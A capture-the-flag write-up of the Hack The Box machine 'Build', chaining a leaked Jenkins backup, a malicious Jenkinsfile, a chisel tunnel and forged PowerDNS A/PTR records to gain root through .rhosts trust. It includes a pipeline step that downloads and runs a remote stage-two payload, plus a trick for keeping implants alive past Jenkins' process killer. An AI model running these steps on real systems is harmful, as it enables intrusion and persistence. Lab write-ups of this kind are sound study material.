# Build — Hack The Box, Medium, Linux

*Flags redacted. Machine address generalised to `10.129.x.x`.*

A CI-to-DNS chain: an exposed Jenkins backup leaks a Gitea credential, a
malicious pipeline gives root in a container, and the way back out to the host is
not a kernel bug or a sudo rule but *DNS* — the host trusts a hostname for
password-less login, and we control the name server.

## Recon

Seven TCP ports: SSH (22), DNS (53, PowerDNS), the three Berkeley r-services
(512/513/514), rsync (873), and Gitea (3000). The r-services are the tell: they
are almost never open by accident, so `.rhosts`-based trust is likely the endgame.
DNS and Gitea reply with a TTL one lower than SSH — those services live in
containers behind the host.

## rsync → a Jenkins backup

The rsync daemon offers one anonymous module, `backups`, holding a ~360 MB
`jenkins.tar.gz`. Anonymous read, so we just pull it.

## Decrypting the Jenkins credential

Jenkins stores credentials encrypted, but the key material sits right beside them
in the backup: `secrets/master.key` and `secrets/hudson.util.Secret`. With those
plus the folder credential in `jobs/build/config.xml`, offline decryption yields:

```
buildadm : Git1234!
```

Those creds don't work on SSH, but they log into Gitea.

## Gitea → pipeline RCE (foothold, user.txt)

The interesting repo is `buildadm/dev`, containing a single `Jenkinsfile`. Its
shape (and the Jenkins artefacts in the backup) says a Jenkins multibranch job
polls this repo and runs the `Jenkinsfile` on every change. That is remote code
execution by design: replace the build step with our own command.

```groovy
pipeline {
  agent any
  stages { stage('x') { steps { sh 'curl -s http://<vpn>/stage2 -o /tmp/.s && sh /tmp/.s' } } }
}
```

Within a minute the pipeline runs it **as root inside the jenkins container**
(172.18.0.3). `user.txt` is in that container's `/root`.

```
user.txt — <32-hex-flag>
```

**Gotcha worth remembering:** anything you background from a pipeline step is
killed when the build ends — Jenkins' ProcessTreeKiller hunts child processes by
the `JENKINS_NODE_COOKIE`/`BUILD_ID` environment variables. To keep a tunnel or
implant alive past the build, launch it with those variables overridden
(`JENKINS_NODE_COOKIE=dontKillMe`) and detached (`setsid`, fds to `/dev/null`).
The first chisel client died silently until this was accounted for.

## Inside the Docker network

The CI container has almost nothing installed (curl only, no `nsupdate`/`mysql`),
so we push a static `chisel` client through the same pipeline channel and open a
SOCKS tunnel back through it. That exposes the rest of the compose stack:

- **MySQL** (`172.18.0.4`): `root` with **no password**, holding the
  `powerdnsadmin` database — the PowerDNS `domains`/`records` backend.
- **PowerDNS** authoritative + HTTP API (`172.18.0.5:8081`, API key `secret`).
- **PowerDNS-Admin** web UI (`172.18.0.6`).

## The way to host root: trust anchored in DNS

The host's `/root/.rhosts` reads:

```
admin.build.vl +
intern.build.vl +
```

That means: a client whose hostname is `admin.build.vl` (or `intern.build.vl`)
may use the Berkeley r-services (512–514) as any user, **no password**. `rshd`
decides "who are you" by *forward-confirmed reverse DNS*: it reverse-resolves the
connecting IP to a name, then re-resolves that name and checks the address
matches, then tests the name against `.rhosts`.

We own the name server for `build.vl`, so we make ourselves `admin.build.vl`:

1. `A  admin.build.vl → <our VPN IP>` (forward).
2. A reverse zone for our /24 with `PTR <our IP> → admin.build.vl`.

The forward record alone is not enough here: without the PTR, the host's
reverse lookup of our address fails and `rshd` rejects us
(`getnameinfo: temporary failure`). Adding the reverse zone closes the loop.
Because PowerDNS caches, the new reverse zone only went live after a cache flush
via the HTTP API (`PUT /cache/flush`).

With both records live and confirmed:

```
dig -x <our IP> @build  →  admin.build.vl
```

`rsh -l root` now authenticates as a trusted host and runs as root on `build`:

```
$ rsh -l root build 'id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root)
root.txt — <32-hex-flag>
```

## Takeaways

- A backup is a credential store. An anonymous rsync module holding a Jenkins
  backup was the whole game — Jenkins' encryption is reversible when the key
  travels with the data.
- CI that builds attacker-influenced code is RCE; treat build agents as
  already-compromised and never as root, never adjacent to host trust.
- `.rhosts` + r-services anchor authentication to a hostname, and a hostname is
  only as trustworthy as the name server. If an attacker can write the zone, the
  trust is theirs. Disable r-services; never trust a spoofable name.
